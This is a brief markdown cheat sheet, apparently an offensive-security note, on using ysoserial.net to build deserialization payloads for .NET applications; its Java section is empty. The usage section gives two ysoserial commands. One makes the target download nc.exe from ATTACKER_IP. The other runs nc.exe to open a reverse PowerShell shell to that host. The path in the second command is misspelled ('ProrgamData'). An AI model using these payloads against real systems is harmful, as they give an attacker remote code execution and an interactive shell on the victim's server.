# Ysoserial Deserialization Payload Generator

## Languages supported: .NET ASP, Java

## Repos: 

### https://github.com/frohoff/ysoserial (Java)

### https://github.com/pwntester/ysoserial.net (.NET ASP)

### Usage:

## .NET Deserialization

 - unzip the zipped ysoserial file if you have downloaded it from the releases of the repository
 
 - .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl ATTACKER_IP/nc.exe -o C:\ProgramData\nc.exe"

 - .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProrgamData\nc.exe -e powershell ATTACKER_IP PORT"

## Java

 - 
